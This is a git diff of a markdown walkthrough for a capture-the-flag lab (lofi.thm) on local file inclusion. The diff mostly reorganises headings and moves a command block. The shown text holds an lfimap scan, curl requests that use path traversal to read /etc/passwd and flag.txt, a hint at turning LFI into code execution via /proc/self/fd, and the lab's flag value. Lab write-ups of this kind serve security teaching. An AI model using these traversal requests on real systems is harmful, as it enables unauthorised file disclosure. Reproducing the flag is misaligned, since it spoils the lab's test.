@@ -95,7 +95,7 @@ http://lofi.thm/?page=sleep.php
 ```
 
  
-### Vulnerability Identification
+## Vulnerability Identification
 ```bash
 ~ > python3 lfimap.py -U http://lofi.thm/\?page\=testme -a -v
 [i] Session information is not provided. LFImap might have troubles finding vulnerabilities if testing endpoint requires authentication.
@@ -128,6 +128,7 @@ Vulnerabilities found: 3
 ```
 ![acces_log](access_log.png)
 ## Exploitation
+### LFI 
 ```bash
 
 ~ > curl -s http://lofi.thm/\?page\=file%3A%2F%2F%2Fetc%2Fpasswd | grep "sh$"
@@ -150,10 +151,7 @@ gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
 nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
 libuuid:x:100:101::/var/lib/libuuid:/bin/sh
 ```
-```bash
-~ > curl -s http://lofi.thm/\?page\=../../../../flag.txt | grep flag
-						flag{e4478e0eab69bd642b8238765dcb7d18}                	</div>
-```
+
 ## Relected XSS
 ![xss](reflected-xss.png)
 ## LFI to RCE
@@ -216,5 +214,9 @@ $ curl -s http://lofi.thm/?page=../../../../proc/self/fd/6 | grep -w '200' | hea
 ```
 ### Flags
 ![flags](flag.png)
+```bash
+~ > curl -s http://lofi.thm/\?page\=../../../../flag.txt | grep flag
+						flag{e4478e0eab69bd642b8238765dcb7d18}                	</div>
+```
 
  
